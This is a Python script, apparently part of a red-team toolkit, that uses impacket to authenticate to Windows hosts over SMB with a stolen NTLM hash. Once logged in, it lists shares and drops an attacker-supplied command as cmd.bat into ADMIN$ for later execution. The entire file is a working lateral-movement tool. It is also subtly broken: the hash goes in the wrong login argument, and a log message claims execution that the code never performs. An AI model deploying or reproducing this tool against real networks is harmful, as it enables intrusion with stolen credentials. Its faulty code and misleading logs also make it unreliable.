#!/usr/bin/env python3

# redteam_toolkit/lateral_movement/pth_tools/pth_smb.py
# Genesis-PTH v2.8 — индустриальный модуль lateral movement через SMB с NTLM-хэшами

import argparse
import os
import logging
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations
from impacket.examples.utils import parse_target
from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PTH-SMB")

def connect_smb(target, username, domain, nthash, lhost=None, lport=445):
    try:
        logger.info(f"[+] Connecting to {target} as {domain}\\{username} with NT hash")

        smbclient = SMBConnection(target, target, sess_port=lport)
        smbclient.login(username, '', domain, nthash, '', '', None)

        logger.info("[+] Authentication success (NTLM PTH)")
        return smbclient
    except Exception as e:
        logger.error(f"[-] Failed: {e}")
        return None

def list_shares(smbclient):
    try:
        shares = smbclient.listShares()
        for share in shares:
            logger.info(f"[*] Found share: {share['shi1_netname'].decode().strip()}")
    except Exception as e:
        logger.error(f"[-] Error listing shares: {e}")

def execute_cmd(smbclient, command, share="ADMIN$", path="Temp\\"):
    try:
        tid = smbclient.connectTree(share)
        fid = smbclient.createFile(tid, path + "cmd.bat")
        smbclient.writeFile(tid, fid, command.encode())
        smbclient.closeFile(tid, fid)
        logger.info("[+] Command dropped, attempting execution via svcctl")

        # Remote execution can be handled externally or extended here
        logger.info("[!] Manual execution or C2 module trigger needed")

    except Exception as e:
        logger.error(f"[-] Execution failed: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="Genesis PTH SMB lateral tool")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-d", "--domain", default="", help="Domain")
    parser.add_argument("-H", "--hash", required=True, help="NTLM hash")
    parser.add_argument("--cmd", help="Command to execute remotely")
    parser.add_argument("--list", action="store_true", help="List available shares")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    conn = connect_smb(args.target, args.username, args.domain, args.hash)
    if not conn:
        exit(1)

    if args.list:
        list_shares(conn)
    elif args.cmd:
        execute_cmd(conn, args.cmd)
    else:
        logger.warning("[-] No action specified. Use --list or --cmd")

    conn.close()
